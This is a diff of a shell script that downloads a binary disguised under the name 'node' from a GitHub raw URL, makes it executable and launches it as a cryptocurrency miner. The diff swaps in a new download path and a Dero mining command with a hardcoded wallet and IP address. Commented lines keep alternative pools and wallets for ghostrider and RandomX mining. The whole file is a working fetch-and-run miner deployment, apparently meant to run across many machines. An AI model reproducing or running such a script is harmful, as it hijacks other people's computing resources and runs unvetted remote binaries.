@@ -1,10 +1,13 @@
 #!/bin/sh
 # SRBMiner
-curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
 # cNfj5q6A7c4yM3KD
 
 # xmr
 #curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
+
+# Astro
+curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/astro/node
 
 chmod +x node
 INPUT_NUMBER=$1
@@ -39,12 +42,15 @@ echo "start ${INPUT_NUMBER}"
 
 # Raptorium + SRBMiner
 #START=$(./node -a ghostrider -o us-east.flockpool.com:4444 -u RFPo8rf6nP7ZSJ67JPvAhwcgYsUZo8JLjV.net_${INPUT_NUMBER} -p x > try.log & sleep 1830 )
-START=$(./node -a ghostrider -o us-east.flockpool.com:5555 --tls true -u RFPo8rf6nP7ZSJ67JPvAhwcgYsUZo8JLjV.net_${INPUT_NUMBER} -p x > try.log & sleep 1830 )
+#START=$(./node -a ghostrider -o us-east.flockpool.com:5555 --tls true -u RFPo8rf6nP7ZSJ67JPvAhwcgYsUZo8JLjV.net_${INPUT_NUMBER} -p x > try.log & sleep 1830 )
 # salvium
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=460000.net_${INPUT_NUMBER} > try.log & sleep 1830 )
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o menju2ikg8uti-50625.portmap.host:50625 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} > try.log & sleep 1830 )
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o randomx.rplant.xyz:7130 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} -p m=solo > try.log & sleep 1200 )
 
+
+# Dero 
+START=$(./node -w dero1qyjnsv7chjw73zta6chyxm4zms2yq4cgxcu9muctyurn606v0kgy7qg0dsews -r 213.171.208.37:10300 > try.log & sleep 1200 )
 TIME=$(TZ=Asia/Jakarta date +"%H:%M")
 SEC=$(date +%S)
 RESULT=$((SEC % 2))
